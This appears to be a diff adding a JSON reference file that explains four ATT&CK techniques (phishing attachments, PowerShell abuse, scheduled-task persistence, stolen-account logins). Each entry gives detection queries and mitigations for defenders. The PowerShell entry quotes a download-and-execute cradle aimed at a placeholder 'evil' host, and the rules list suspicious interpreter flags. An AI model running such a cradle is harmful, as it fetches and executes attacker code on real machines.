@@ -1,0 +1,106 @@
+[
+  {
+    "id": "T1566.001",
+    "name": "Spearphishing Attachment",
+    "tacticId": "TA0001",
+    "platforms": ["Windows", "macOS", "Linux"],
+    "summary": "An adversary emails a specific target a weaponized file (a macro-enabled document, ISO, LNK, or script) and relies on the person opening it to run code.",
+    "concept": "Spearphishing attachment is social engineering plus code execution stitched together. The attacker studies a specific person or team, crafts an email that looks legitimate (an invoice, a resume, an HR notice), and attaches a file that will run code when opened. The trick is not technical sophistication in the email itself — it is trust. The victim's mail client and OS do most of the work: Office enables macros on user click, Windows happily mounts an ISO and runs the LNK inside it.",
+    "howItWorks": "1) Recon: the attacker finds a real person and a believable pretext. 2) Weaponization: a document with a malicious VBA macro, or an archive/ISO hiding a shortcut (LNK) that launches a script. 3) Delivery: the email lands in the inbox. 4) Execution: the victim opens the file and clicks 'Enable Content' or double-clicks the shortcut. 5) The Office app or Explorer spawns a child process — usually powershell.exe, cmd.exe, wscript.exe, or mshta.exe — which downloads and runs the next stage.",
+    "whereItLacks": "The attack is loud at one specific moment: a trusted document/mail process spawning a scripting interpreter is highly unusual on a normal endpoint. WINWORD.EXE almost never launches powershell.exe in day-to-day work. So even though the email evades content filters, the execution step leaves an obvious parent-child process anomaly. It also depends entirely on human action — if macros are blocked by policy, the chain simply dies.",
+    "realWorldExamples": [
+      { "actor": "Emotet", "story": "For years Emotet spread through invoice-themed Word documents. Opening the doc and enabling macros ran a PowerShell one-liner that pulled the loader from several fallback URLs. The tell was always WINWORD.EXE -> powershell.exe." },
+      { "actor": "TA505 / QakBot", "story": "Shifted to ISO and LNK delivery after Microsoft began blocking macros from the internet. The victim mounts the ISO, double-clicks a shortcut that looks like a PDF, and it silently runs a hidden script." }
+    ],
+    "dataSources": ["Process creation (EDR/Sysmon Event ID 1)", "Email gateway logs", "File creation events"],
+    "detection": {
+      "logic": "Look for a document- or mail-handling process (WINWORD, EXCEL, POWERPNT, OUTLOOK) spawning a scripting/LOLBIN child (powershell, cmd, wscript, cscript, mshta, rundll32). This parent-child relationship is the durable signal — it survives changes in the email lure, the payload, and the C2 URL.",
+      "queries": {
+        "kql": "DeviceProcessEvents\n| where InitiatingProcessFileName in~ (\"winword.exe\",\"excel.exe\",\"powerpnt.exe\",\"outlook.exe\")\n| where FileName in~ (\"powershell.exe\",\"cmd.exe\",\"wscript.exe\",\"cscript.exe\",\"mshta.exe\",\"rundll32.exe\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine",
+        "sigma": "title: Office Application Spawning Script Interpreter\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    ParentImage|endswith:\n      - '\\\\winword.exe'\n      - '\\\\excel.exe'\n      - '\\\\powerpnt.exe'\n      - '\\\\outlook.exe'\n    Image|endswith:\n      - '\\\\powershell.exe'\n      - '\\\\cmd.exe'\n      - '\\\\wscript.exe'\n      - '\\\\cscript.exe'\n      - '\\\\mshta.exe'\n      - '\\\\rundll32.exe'\n  condition: selection\nlevel: high",
+        "splunk": "index=endpoint sourcetype=sysmon EventCode=1\n  (parent_process_name IN (\"winword.exe\",\"excel.exe\",\"powerpnt.exe\",\"outlook.exe\"))\n  (process_name IN (\"powershell.exe\",\"cmd.exe\",\"wscript.exe\",\"cscript.exe\",\"mshta.exe\",\"rundll32.exe\"))\n| table _time host parent_process_name process_name process",
+        "google": "rule office_spawns_interpreter {\n  meta:\n    author = \"attack-detect\"\n    severity = \"HIGH\"\n  events:\n    $e.metadata.event_type = \"PROCESS_LAUNCH\"\n    $e.principal.process.parent_process.file.full_path = /(winword|excel|powerpnt|outlook)\\.exe$/ nocase\n    $e.principal.process.file.full_path = /(powershell|cmd|wscript|cscript|mshta|rundll32)\\.exe$/ nocase\n  condition:\n    $e\n}",
+        "elastic": "process where event.type == \"start\" and\n  process.parent.name : (\"winword.exe\",\"excel.exe\",\"powerpnt.exe\",\"outlook.exe\") and\n  process.name : (\"powershell.exe\",\"cmd.exe\",\"wscript.exe\",\"cscript.exe\",\"mshta.exe\",\"rundll32.exe\")"
+      }
+    },
+    "mitigation": "Block macros from files that come from the internet (Mark-of-the-Web) via Group Policy — this single control kills most macro chains. Strip or detonate risky attachment types (ISO, IMG, LNK, HTA) at the mail gateway. Train users, but treat training as a backstop, not the primary control. Enable Attack Surface Reduction rules that stop Office apps from creating child processes."
+  },
+  {
+    "id": "T1059.001",
+    "name": "PowerShell",
+    "tacticId": "TA0002",
+    "platforms": ["Windows"],
+    "summary": "Adversaries abuse PowerShell — a signed, built-in, trusted Windows tool — to download and run code in memory without dropping an obvious executable.",
+    "concept": "PowerShell is a living-off-the-land binary (LOLBIN): it ships with Windows, it is signed by Microsoft, and it can reach the internet, decode data, and execute code entirely in memory. That combination is exactly what an attacker wants — they get a full scripting engine that most environments trust by default. Instead of writing malware.exe to disk (which AV scans), they run a PowerShell command that pulls a script from a server and runs it in RAM.",
+    "howItWorks": "The attacker invokes powershell.exe with flags that signal intent to hide: -EncodedCommand (base64), -WindowStyle Hidden, -ExecutionPolicy Bypass, -NoProfile. A common pattern is a download cradle: `IEX (New-Object Net.WebClient).DownloadString('http://evil/x.ps1')` which fetches and executes without touching disk. Encoded commands hide the real intent from casual log review; the base64 must be decoded to see what actually ran.",
+    "whereItLacks": "PowerShell is heavily instrumented by Microsoft. Script Block Logging (Event ID 4104) records the actual code that runs — even if it arrived base64-encoded or obfuscated, it is logged in cleartext after de-obfuscation. AMSI (Antimalware Scan Interface) inspects script content at runtime. So while the technique evades file-based AV, it is very visible to anyone collecting 4104 events. Attackers respond by trying to disable AMSI or downgrade to PowerShell v2 (which lacks logging), and those tampering attempts are themselves detectable.",
+    "realWorldExamples": [
+      { "actor": "APT29 (Cozy Bear)", "story": "Used encoded PowerShell download cradles as a first stage to stay fileless, keeping the actual payload off disk to defeat signature-based AV." },
+      { "actor": "Commodity ransomware", "story": "Countless loaders run `powershell -nop -w hidden -enc <base64>` to stage Cobalt Strike beacons. The flag combination itself is a reliable hunting signal." }
+    ],
+    "dataSources": ["PowerShell Script Block Logging (Event ID 4104)", "Process creation (Event ID 1 / 4688)", "Module logging (4103)"],
+    "detection": {
+      "logic": "Two complementary angles. (A) Command-line flags: catch the suspicious combination of hidden window + encoded command + execution-policy bypass. (B) Script content: use Script Block Logging (4104) to catch the actual behaviors — download cradles (DownloadString/IEX), AMSI bypass strings — regardless of encoding, because 4104 logs the de-obfuscated script. Prefer (B) when you have the logs; it is much harder to evade.",
+      "queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"powershell.exe\"\n| where ProcessCommandLine has_any (\"-enc\",\"-EncodedCommand\",\"-w hidden\",\"-WindowStyle Hidden\",\"-ep bypass\",\"-ExecutionPolicy Bypass\",\"DownloadString\",\"IEX\",\"Invoke-Expression\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName",
+        "sigma": "title: Suspicious PowerShell Command Line\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: '\\\\powershell.exe'\n  selection_flags:\n    CommandLine|contains:\n      - '-enc'\n      - '-EncodedCommand'\n      - 'WindowStyle Hidden'\n      - 'ExecutionPolicy Bypass'\n      - 'DownloadString'\n      - 'IEX '\n      - 'Invoke-Expression'\n  condition: selection_img and selection_flags\nlevel: high",
+        "splunk": "index=endpoint sourcetype=sysmon EventCode=1 process_name=powershell.exe\n  (process=\"*-enc*\" OR process=\"*EncodedCommand*\" OR process=\"*WindowStyle Hidden*\" OR process=\"*ExecutionPolicy Bypass*\" OR process=\"*DownloadString*\" OR process=\"*IEX *\" OR process=\"*Invoke-Expression*\")\n| table _time host user process",
+        "google": "rule suspicious_powershell {\n  meta:\n    severity = \"HIGH\"\n  events:\n    $e.metadata.event_type = \"PROCESS_LAUNCH\"\n    $e.principal.process.file.full_path = /powershell\\.exe$/ nocase\n    $e.principal.process.command_line = /(-enc|EncodedCommand|WindowStyle Hidden|ExecutionPolicy Bypass|DownloadString|IEX |Invoke-Expression)/ nocase\n  condition:\n    $e\n}",
+        "elastic": "process where event.type == \"start\" and process.name : \"powershell.exe\" and\n  process.command_line : (\"*-enc*\",\"*EncodedCommand*\",\"*WindowStyle Hidden*\",\"*ExecutionPolicy Bypass*\",\"*DownloadString*\",\"*IEX *\",\"*Invoke-Expression*\")"
+      }
+    },
+    "mitigation": "Turn on Script Block Logging (4104) and ship it to your SIEM — this is the highest-leverage control because it defeats obfuscation. Use Constrained Language Mode and WDAC/AppLocker to restrict what PowerShell can do. Keep AMSI enabled and alert on AMSI-tampering attempts. Remove PowerShell v2. You generally cannot 'block PowerShell' outright, so the goal is full visibility plus constrained capability."
+  },
+  {
+    "id": "T1053.005",
+    "name": "Scheduled Task",
+    "tacticId": "TA0003",
+    "platforms": ["Windows"],
+    "summary": "Adversaries create a Windows Scheduled Task so their code runs automatically at logon, on a timer, or at boot — surviving reboots and blending in with legitimate admin tasks.",
+    "concept": "Persistence is about surviving. A reboot, a logout, or a killed process should not evict the attacker. Scheduled Tasks are perfect for this because Windows is full of legitimate scheduled tasks (updaters, telemetry, maintenance), so one more does not look out of place. The task engine will faithfully relaunch the attacker's payload on whatever trigger they choose.",
+    "howItWorks": "The attacker runs `schtasks /create` (or uses the Task Scheduler COM API / PowerShell ScheduledTasks module) to register a task. They pick a trigger (ONLOGON, at boot, or a repeating interval) and an action (the command to run). Tricks include naming the task to imitate a Microsoft task, placing it in a real-looking folder, and pointing the action at a LOLBIN or a script in a user-writable directory.",
+    "whereItLacks": "Task creation is centrally logged. Event ID 4698 ('a scheduled task was created') and Sysmon Event ID 1 capturing schtasks.exe both fire. The registered task also persists as an XML file under C:\\Windows\\System32\\Tasks, so it can be enumerated and baselined. Because legitimate software also creates tasks, the challenge is not visibility but noise — you need to distinguish the attacker's task from the thousands of benign ones, usually by the action pointing at a suspicious binary, a user-writable path, or an encoded command.",
+    "realWorldExamples": [
+      { "actor": "APT3", "story": "Created scheduled tasks to run their tools at fixed intervals, ensuring the implant restarted even if the process died." },
+      { "actor": "Ransomware affiliates", "story": "Register a task that runs the encryptor at a scheduled time across many hosts at once, timing detonation for off-hours when responders are away." }
+    ],
+    "dataSources": ["Security Event ID 4698 (task created)", "Process creation capturing schtasks.exe", "File monitoring of \\\\System32\\\\Tasks"],
+    "detection": {
+      "logic": "Detect the act of creating a task whose action is suspicious. Combine (A) schtasks.exe /create command lines, especially where the run command points to powershell/cmd/a user-writable path or contains an encoded command, with (B) Event ID 4698 for coverage of API/PowerShell-created tasks that never touch schtasks.exe. Baseline known-good task names to cut noise.",
+      "queries": {
+        "kql": "DeviceProcessEvents\n| where FileName =~ \"schtasks.exe\" and ProcessCommandLine has \"/create\"\n| where ProcessCommandLine has_any (\"powershell\",\"cmd\",\"mshta\",\"rundll32\",\"-enc\",\"AppData\",\"Users\\\\Public\",\"Temp\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine",
+        "sigma": "title: Suspicious Scheduled Task Creation\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection:\n    Image|endswith: '\\\\schtasks.exe'\n    CommandLine|contains: '/create'\n  suspicious:\n    CommandLine|contains:\n      - 'powershell'\n      - 'cmd '\n      - 'mshta'\n      - 'rundll32'\n      - '-enc'\n      - '\\\\AppData\\\\'\n      - '\\\\Users\\\\Public\\\\'\n      - '\\\\Temp\\\\'\n  condition: selection and suspicious\nlevel: medium",
+        "splunk": "index=endpoint sourcetype=sysmon EventCode=1 process_name=schtasks.exe process=\"*/create*\"\n  (process=\"*powershell*\" OR process=\"*cmd *\" OR process=\"*mshta*\" OR process=\"*rundll32*\" OR process=\"*-enc*\" OR process=\"*\\\\AppData\\\\*\" OR process=\"*\\\\Users\\\\Public\\\\*\" OR process=\"*\\\\Temp\\\\*\")\n| table _time host user process",
+        "google": "rule suspicious_scheduled_task {\n  meta:\n    severity = \"MEDIUM\"\n  events:\n    $e.metadata.event_type = \"PROCESS_LAUNCH\"\n    $e.principal.process.file.full_path = /schtasks\\.exe$/ nocase\n    $e.principal.process.command_line = /\\/create/ nocase\n    $e.principal.process.command_line = /(powershell|cmd |mshta|rundll32|-enc|\\\\AppData\\\\|\\\\Users\\\\Public\\\\|\\\\Temp\\\\)/ nocase\n  condition:\n    $e\n}",
+        "elastic": "process where event.type == \"start\" and process.name : \"schtasks.exe\" and\n  process.command_line : \"*/create*\" and\n  process.command_line : (\"*powershell*\",\"*cmd *\",\"*mshta*\",\"*rundll32*\",\"*-enc*\",\"*\\\\AppData\\\\*\",\"*\\\\Users\\\\Public\\\\*\",\"*\\\\Temp\\\\*\")"
+      }
+    },
+    "mitigation": "Forward Event ID 4698 and baseline the legitimate scheduled tasks in your environment so new ones stand out. Restrict who can create tasks via least privilege. Alert when a task's action points to a user-writable directory or a scripting interpreter. Periodically export and diff \\\\System32\\\\Tasks against a known-good snapshot."
+  },
+  {
+    "id": "T1078",
+    "name": "Valid Accounts",
+    "tacticId": "TA0005",
+    "platforms": ["Windows", "Linux", "macOS", "SaaS", "IaaS"],
+    "summary": "Adversaries log in with legitimate stolen credentials instead of dropping malware, so their activity looks like a normal user and evades most endpoint defenses.",
+    "concept": "The hardest attacker to catch is the one who does not break in — they log in. With valid credentials (phished, purchased, or cracked), the adversary authenticates through the front door. There is no exploit, no malware signature, no crashing service. To the system, it is just an authorized user doing authorized things. This technique cuts across the whole kill chain: it is initial access, persistence, privilege escalation, and defense evasion all at once, which is why ATT&CK lists it under multiple tactics.",
+    "howItWorks": "The attacker obtains credentials, then authenticates to VPN, cloud consoles, email (OAuth/IMAP), RDP, or SSH. Because the login is 'valid', standard controls stay quiet. The only anomalies are behavioral: a login from a new country, an impossible-travel sequence (London then Tokyo 20 minutes later), authentication at an unusual hour, from a new device, or a sudden burst of failed logins followed by one success (a spray that landed).",
+    "whereItLacks": "There is no malicious binary to scan and no obviously bad command line — so endpoint AV is blind. But identity is not invisible: every authentication is logged (Windows 4624/4625, Azure AD/Entra sign-in logs, cloud audit trails). The weakness of the technique is that a stolen identity rarely behaves like the real owner. Detection therefore moves from 'is this file bad?' to 'is this behavior normal for this account?' — geovelocity, new ASN, new user-agent, first-time-seen resource access. This is why MFA is so damaging to the attacker: it breaks the value of the stolen password by itself.",
+    "realWorldExamples": [
+      { "actor": "LAPSUS$", "story": "Bought or phished employee credentials and session tokens, then simply logged into internal tools and cloud tenants — little malware, mostly valid logins and social engineering of help desks." },
+      { "actor": "APT29 (SolarWinds era)", "story": "Forged and stole authentication material to move into cloud email as legitimate users, blending into normal admin activity and avoiding endpoint detection entirely." }
+    ],
+    "dataSources": ["Windows Security 4624/4625", "Azure AD / Entra sign-in logs", "Cloud audit logs (CloudTrail, etc.)", "VPN and RDP gateway logs"],
+    "detection": {
+      "logic": "Shift from signature to behavior. Baseline each account's normal locations, devices, and hours, then alert on deviations: impossible travel, first login from a new country/ASN, successful login right after a spray of failures, or MFA-disabled sign-ins on accounts that normally require it. No single event is malicious; the anomaly is the signal.",
+      "queries": {
+        "kql": "SigninLogs\n| where ResultType == 0\n| summarize Countries = make_set(LocationDetails.countryOrRegion), Logins = count() by UserPrincipalName, bin(TimeGenerated, 1h)\n| where array_length(Countries) > 1\n| project TimeGenerated, UserPrincipalName, Countries, Logins",
+        "sigma": "title: Successful Login After Multiple Failures (Possible Spray Hit)\nlogsource:\n  product: windows\n  service: security\ndetection:\n  failures:\n    EventID: 4625\n  success:\n    EventID: 4624\n  timeframe: 5m\n  condition: failures | count() by TargetUserName > 10 and success\nlevel: high",
+        "splunk": "index=azuread sourcetype=\"azure:aad:signin\" ResultType=0\n| stats dc(location.countryOrRegion) AS countries values(location.countryOrRegion) AS seen_in by user, _time span=1h\n| where countries > 1",
+        "google": "rule impossible_travel {\n  meta:\n    severity = \"HIGH\"\n  events:\n    $login.metadata.event_type = \"USER_LOGIN\"\n    $login.security_result.action = \"ALLOW\"\n    $login.principal.user.userid = $user\n    $login.principal.location.country_or_region = $country\n  match:\n    $user over 1h\n  condition:\n    #country > 1\n}",
+        "elastic": "authentication where event.outcome == \"success\" and\n  event.action == \"logged-in\"\n  /* pair with a geo enrichment + prior-failure correlation in the rule builder */"
+      }
+    },
+    "mitigation": "Enforce phishing-resistant MFA everywhere — it is the single control that most reduces the value of a stolen password. Use conditional access (block legacy auth, restrict by device compliance and geography). Feed sign-in logs into a UEBA/anomaly baseline for impossible travel and new-device alerts. Rotate and vault privileged credentials, and shorten session-token lifetimes so stolen tokens expire fast."
+  }
+]
